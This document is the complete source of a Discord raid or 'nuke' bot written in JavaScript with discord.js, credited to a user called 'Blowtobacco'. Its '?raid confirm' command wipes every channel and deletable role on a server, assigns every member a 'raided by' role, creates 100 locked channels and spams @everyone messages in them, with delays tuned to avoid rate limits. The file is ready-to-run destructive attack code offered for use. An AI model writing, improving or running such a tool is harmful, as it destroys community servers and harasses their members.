// raid.js - A separate script for the DANGEROUS ?raid command

const { Client, GatewayIntentBits, EmbedBuilder, PermissionsBitField } = require('discord.js');

// --- EXTREMELY IMPORTANT CONFIGURATION FOR THIS BOT ---
// !!! WARNING: THIS COMMAND IS DESTRUCTIVE AND IRREVERSIBLE !!!

const TOKEN = 'BOT_TOKEN'; // IMPORTANT: Replace with your bot token
const CLIENT_ID = 'APP_ID'; // IMPORTANT: Replace with your bot application ID
const USER = 'YOUR_USER'; // Set your username here

const PREFIX = '?'; // Command prefix
const EMBED_COLOR = '#FF0000'; // Red color for warnings
const FOOTER_TEXT = 'Blowtobacco, made with ❤️';

// --- CONFIGURATION FOR THE NEW SERVER STRUCTURE ---
const RAID_ROLE_NAME = `『💀』raided by ${USER}`;
const RAID_CHANNEL_BASE_NAME = `『💀』raided-by-${USER}`;
const NUMBER_OF_CHANNELS_TO_CREATE = 100;
const RAID_MESSAGE_CONTENT = `# Raided by ${USER} @everyone`;
const MESSAGES_PER_CHANNEL = 6; // Number of messages to send in each new channel

// --- CONFIGURATION TO AVOID RATE LIMITS AND CONTROL SPEED ---
// WARNING: Lowering these values increases the RISK of hitting Discord's rate limits!
const CHANNEL_ROLE_OPERATION_DELAY_MS = 100; // 0.1 seconds between channel/role deletions/creations
const MEMBER_ROLE_ASSIGN_DELAY_MS = 100; // 0.1 seconds between assigning roles to members
const MESSAGE_SEND_DELAY_MS = 100; // 0.1 seconds between sending each message

// --- END OF CONFIGURATION ---

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,           // Needed for server info and managing channels/roles
        GatewayIntentBits.GuildMessages,    // Needed to read messages
        GatewayIntentBits.MessageContent,   // Privileged intent, required to read message content
        GatewayIntentBits.GuildMembers      // Privileged intent, required for fetching all members
    ]
});

// Utility function to wait
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Event: Bot is ready and connected
client.once('ready', () => {
    console.log(`[BOT DEBUG] Bot is ready. Logged in as ${client.user.tag}!`);
    client.user.setActivity(`WARNING: ${PREFIX}raid confirm`, { type: 'WATCHING' });
});

// Event: A message is created
client.on('messageCreate', async message => {
    console.log(`[BOT DEBUG] Received message from ${message.author.tag}: "${message.content}" in channel #${message.channel.name}`);

    if (message.author.bot || !message.guild) {
        console.log(`[BOT DEBUG] Ignoring message from bot or outside a guild.`);
        return;
    }

    if (message.content.toLowerCase().startsWith(PREFIX + 'raid')) {
        console.log(`[BOT DEBUG] Processing '?raid' command from ${message.author.tag}.`);

        // 1. Check confirmation argument
        const args = message.content.slice(PREFIX.length + 'raid'.length).trim().split(/ +/);
        if (args[0] !== 'confirm') {
            console.log(`[BOT DEBUG] Confirmation argument 'confirm' missing.`);
            const embed = new EmbedBuilder()
                .setColor(EMBED_COLOR)
                .setTitle('🚨 WARNING: Destructive Command! 🚨')
                .setDescription(
                    `This command will **DELETE ALL CHANNELS AND ROLES** on this server (except for the @everyone role).\n\n` +
                    `It will then create a new role "${RAID_ROLE_NAME}" and ${NUMBER_OF_CHANNELS_TO_CREATE} new channels, sending ${MESSAGES_PER_CHANNEL} messages in each.\n\n` +
                    `**This action is IRREVERSIBLE!** Once the channels are deleted (including this one), the bot **will no longer be able to send messages in Discord** on this server. All further updates will appear **ONLY IN THE BOT TERMINAL**.\n\n` +
                    `**This process will take a LONG TIME!** (Several minutes depending on the number of channels/roles/members and Discord limits).\n\n` +
                    `To confirm and execute, type: \`${PREFIX}raid confirm\``
                )
                .setTimestamp()
                .setFooter({ text: FOOTER_TEXT });
            return message.channel.send({ embeds: [embed] });
        }
        console.log(`[BOT DEBUG] Confirmation argument 'confirm' received.`);

        // 2. Check bot's role hierarchy
        const botMember = message.guild.members.cache.get(client.user.id);
        if (!botMember || !botMember.permissions.has(PermissionsBitField.Flags.Administrator)) {
            console.log(`[BOT DEBUG] Bot lacks Administrator permission or is not found.`);
            const embed = new EmbedBuilder()
                .setColor(EMBED_COLOR)
                .setDescription(`⚠️ **Critical Error!** The bot does not have \`Administrator\` permission or its role is too low in the hierarchy to perform this operation. Ensure the bot's role is **at the very top** in the server role list and has \`Administrator\` permission.`)
                .setTimestamp()
                .setFooter({ text: FOOTER_TEXT });
            return message.channel.send({ embeds: [embed] });
        }
        const everyoneRole = message.guild.roles.cache.get(message.guild.id);
        if (!everyoneRole || botMember.roles.highest.position <= everyoneRole.position) {
            console.log(`[BOT DEBUG] Bot's highest role position (${botMember.roles.highest.position}) is not above @everyone role position (${everyoneRole ? everyoneRole.position : 'N/A'}).`);
            const embed = new EmbedBuilder()
                .setColor(EMBED_COLOR)
                .setDescription(`⚠️ **Role Hierarchy Error!** The bot's role is too low in the server hierarchy. Drag the bot's role **above all other roles** in the server settings and try again.`)
                .setTimestamp()
                .setFooter({ text: FOOTER_TEXT });
            return message.channel.send({ embeds: [embed] });
        }
        console.log(`[BOT DEBUG] Bot has Administrator permission and its role is high enough.`);

        // Final confirmation before starting
        await message.channel.send({
            embeds: [
                new EmbedBuilder()
                    .setColor('#FFA500') // Orange color
                    .setDescription(`**CONFIRMED!** Starting server wipe and reconstruction in 5 seconds. **DO NOT STOP THE BOT!** This process will take time...`)
                    .setTimestamp()
                    .setFooter({ text: FOOTER_TEXT })
            ]
        });
        console.log(`[BOT DEBUG] Sent final confirmation message. Waiting 5 seconds.`);
        await sleep(5000);
        console.log(`[BOT DEBUG] Starting server wipe process.`);

        try {
            // --- DELETE CHANNELS ---
            console.log('[BOT DEBUG] Starting channel deletion phase...');
            const channels = Array.from(message.guild.channels.cache.values());
            console.log(`[BOT DEBUG] Found ${channels.length} channels to process.`);
            let channelsDeletedCount = 0;

            for (const channel of channels) {
                try {
                    await channel.delete();
                    channelsDeletedCount++;
                    console.log(`[BOT DEBUG] Successfully deleted channel: #${channel.name} (${channel.id}). Total deleted: ${channelsDeletedCount}`);
                    await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS);
                } catch (err) {
                    console.error(`[BOT ERROR] Failed to delete channel #${channel.name} (${channel.id}):`, err.message);
                    await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS);
                }
            }
            console.log(`[BOT DEBUG] Finished channel deletion phase. ${channelsDeletedCount} channels deleted.`);

            // --- DELETE ROLES ---
            console.log('[BOT DEBUG] Starting role deletion phase...');
            const roles = Array.from(message.guild.roles.cache.values());
            console.log(`[BOT DEBUG] Found ${roles.length} roles to process.`);
            let rolesDeletedCount = 0;

            for (const role of roles) {
                if (role.id === message.guild.id) { 
                    console.log(`[BOT DEBUG] Skipping @everyone role: ${role.name} (${role.id})`);
                    continue;
                }
                if (role.id === botMember.roles.highest.id) { 
                    console.log(`[BOT DEBUG] Skipping bot's own highest role: ${role.name} (${role.id})`);
                    continue;
                }
                if (!role.editable) { 
                    console.log(`[BOT DEBUG] Skipping uneditable role: ${role.name} (${role.id})`);
                    continue;
                }
                try {
                    await role.delete();
                    rolesDeletedCount++;
                    console.log(`[BOT DEBUG] Successfully deleted role: ${role.name} (${role.id}). Total deleted: ${rolesDeletedCount}`);
                    await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS);
                } catch (err) {
                    console.error(`[BOT ERROR] Failed to delete role ${role.name} (${role.id}):`, err.message);
                    await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS);
                }
            }
            console.log(`[BOT DEBUG] Finished role deletion phase. ${rolesDeletedCount} roles deleted.`);

            // --- CREATE NEW ROLE ---
            console.log(`[BOT DEBUG] Creating role "${RAID_ROLE_NAME}"...`);
            const raidRole = await message.guild.roles.create({
                name: RAID_ROLE_NAME,
                color: '#8B0000', // Dark red
                hoist: true,
                permissions: [
                    PermissionsBitField.Flags.ViewChannel,
                    PermissionsBitField.Flags.ReadMessageHistory
                ],
                reason: 'Role for new server structure (after raid)',
            });
            console.log(`[BOT DEBUG] Role "${RAID_ROLE_NAME}" created with ID: ${raidRole.id}`);
            await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS);
// skid = loser, made by blow
            // --- ASSIGN ROLE TO ALL MEMBERS ---
            console.log(`[BOT DEBUG] Assigning role "${RAID_ROLE_NAME}" to all members...`);
            const members = await message.guild.members.fetch();
            let membersAssignedCount = 0;
            for (const member of members.values()) {
                if (member.user.bot) {
                    console.log(`[BOT DEBUG] Skipping bot member: ${member.user.tag}`);
                    continue;
                }
                try {
                    await member.roles.add(raidRole, `Assign role after raid`);
                    membersAssignedCount++;
                    console.log(`[BOT DEBUG] Assigned role to ${member.user.tag}. Total assigned: ${membersAssignedCount}`);
                    await sleep(MEMBER_ROLE_ASSIGN_DELAY_MS);
                } catch (err) {
                    console.error(`[BOT ERROR] Failed to assign role to ${member.user.tag} (${member.id}):`, err.message);
                    await sleep(MEMBER_ROLE_ASSIGN_DELAY_MS);
                }
            }
            console.log(`[BOT DEBUG] Finished assigning role to members. ${membersAssignedCount} members assigned.`);

            // --- CREATE NEW CHANNELS ---
            console.log(`[BOT DEBUG] Starting creation of ${NUMBER_OF_CHANNELS_TO_CREATE} new channels...`);
            const createdChannels = [];
            let channelsCreatedCount = 0;
            for (let i = 0; i < NUMBER_OF_CHANNELS_TO_CREATE; i++) {
                try {
                    const newChannel = await message.guild.channels.create({
                        name: RAID_CHANNEL_BASE_NAME,
                        type: 0, // 0 = GUILD_TEXT
                        permissionOverwrites: [
                            {
                                id: message.guild.id, // @everyone
                                allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory],
                                deny: [PermissionsBitField.Flags.SendMessages]
                            },
                            {
                                id: raidRole.id,
                                allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.ReadMessageHistory],
                                deny: [PermissionsBitField.Flags.SendMessages]
                            }
                        ],
                        reason: 'Channel for new server structure (after raid)',
                    });
                    createdChannels.push(newChannel);
                    channelsCreatedCount++;
                    console.log(`[BOT DEBUG] Created channel: ${RAID_CHANNEL_BASE_NAME} (${channelsCreatedCount}/${NUMBER_OF_CHANNELS_TO_CREATE})`);
                    await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS);
                } catch (err) {
                    console.error(`[BOT ERROR] Failed to create channel ${RAID_CHANNEL_BASE_NAME} (${i + 1}):`, err.message);
                    await sleep(CHANNEL_ROLE_OPERATION_DELAY_MS * 5);
                }
            }
            console.log(`[BOT DEBUG] Finished new channel creation phase. ${channelsCreatedCount} channels created.`);

            // --- SEND MESSAGES IN NEW CHANNELS ---
            console.log(`[BOT DEBUG] Starting to send ${MESSAGES_PER_CHANNEL} messages in each of ${createdChannels.length} new channels...`);
            let totalMessagesSent = 0;
            for (const channel of createdChannels) {
                for (let i = 0; i < MESSAGES_PER_CHANNEL; i++) {
                    try {
                        await channel.send(RAID_MESSAGE_CONTENT);
                        totalMessagesSent++;
                        console.log(`[BOT DEBUG] Sent message ${i + 1}/${MESSAGES_PER_CHANNEL} in #${channel.name}. Total sent: ${totalMessagesSent}`);
                        await sleep(MESSAGE_SEND_DELAY_MS);
                    } catch (err) {
                        console.error(`[BOT ERROR] Failed to send message in channel #${channel.name} (${channel.id}):`, err.message);
                        await sleep(MESSAGE_SEND_DELAY_MS * 5);
                    }
                }
            }
            console.log(`[BOT DEBUG] Finished sending messages. Total messages sent: ${totalMessagesSent}.`);

            // --- COMPLETION (TERMINAL ONLY) ---
            console.log('[BOT DEBUG] Server reconstruction process completed.');
            console.log('----------------------------------------------------');
            console.log('🎉🎉🎉 SERVER RECONSTRUCTION COMPLETE! 🎉🎉🎉');
            console.log(`Total channels deleted: ${channelsDeletedCount}`);
            console.log(`Total roles deleted: ${rolesDeletedCount}`);
            console.log(`New role "${RAID_ROLE_NAME}" created.`);
            console.log(`Total members assigned role: ${membersAssignedCount}`);
            console.log(`Total channels created: ${channelsCreatedCount}`);
            console.log(`Total messages sent: ${totalMessagesSent}`);
            console.log('----------------------------------------------------');

        } catch (error) {
            console.error('[BOT ERROR] Major error during server reconstruction (in try block):', error);
            console.log('----------------------------------------------------');
            console.log('❌❌❌ SERVER RECONSTRUCTION FAILED! ❌❌❌');
            console.log(`Error: ${error.message}`);
            console.log('Server might be in an inconsistent state.');
            console.log('----------------------------------------------------');
        }
    }
});

// Log in to Discord with your bot's token
client.login(TOKEN);

